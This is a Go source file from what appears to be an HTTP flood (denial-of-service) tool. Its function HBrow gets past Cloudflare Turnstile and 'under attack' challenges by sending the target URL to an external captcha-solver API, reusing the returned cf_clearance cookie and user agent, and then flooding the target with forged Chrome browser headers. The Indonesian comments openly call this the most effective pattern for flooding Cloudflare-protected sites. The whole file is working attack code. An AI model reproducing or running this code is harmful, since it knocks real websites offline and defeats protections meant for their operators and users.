package tactics

import (
	"bytes"
	"context"
	"encoding/json"
	"errors"
	"net/http"
	"os"
	"time"
)

// HBrow — browser emulation + captcha handling.
//
// Idealnya headless browser (Playwright) untuk render JS + solve captcha.
// Implementasi pure-Go di sini memakai "solver API" (mis. cfast) bila
// BROWSER_SOLVER di-set: solve challenge -> dapat cf_clearance -> lanjut flood
// dengan header/UA browser + cookie hasil solve (pola paling efektif untuk
// Cloudflare Turnstile/UAM). Tanpa solver, fallback ke emulasi header hlegit.
func HBrow(ctx context.Context, p Params) (int64, error) {
	solver := os.Getenv("BROWSER_SOLVER")
	cookie := p.Cookie
	ua := p.UA

	if solver != "" {
		clr, sua, err := solveChallenge(solver, p.Target)
		if err == nil {
			cookie = "cf_clearance=" + clr
			if sua != "" {
				ua = sua
			}
		}
	}

	p.Cookie = cookie
	p.UA = ua

	cfg := floodConfig{
		httpMethod: "GET",
		http2:      true,
		keepAlive:  true,
		headers: map[string]string{
			"sec-ch-ua":                `"Chromium";v="152", "Not_A Brand";v="24", "Google Chrome";v="152"`,
			"sec-ch-ua-mobile":         "?0",
			"sec-ch-ua-platform":       `"Windows"`,
			"upgrade-insecure-requests": "1",
			"sec-fetch-site":           "none",
			"sec-fetch-mode":           "navigate",
			"sec-fetch-dest":           "document",
			"accept-language":          "en-US,en;q=0.9",
		},
	}
	return runFlood(ctx, p, cfg)
}

func solveChallenge(solverURL, target string) (clearance string, ua string, err error) {
	payload, _ := json.Marshal(map[string]string{"url": target})
	req, err := http.NewRequest("POST", solverURL+"/solve", bytes.NewReader(payload))
	if err != nil {
		return "", "", err
	}
	req.Header.Set("Content-Type", "application/json")
	client := &http.Client{Timeout: 120 * time.Second}
	resp, err := client.Do(req)
	if err != nil {
		return "", "", err
	}
	defer resp.Body.Close()
	var out struct {
		Status      int    `json:"status"`
		CfClearance string `json:"cf_clearance"`
		UA          string `json:"ua"`
		Error       string `json:"error"`
	}
	if err := json.NewDecoder(resp.Body).Decode(&out); err != nil {
		return "", "", err
	}
	if out.Status != 1 || out.CfClearance == "" {
		return "", "", errors.New("solver: " + out.Error)
	}
	return out.CfClearance, out.UA, nil
}
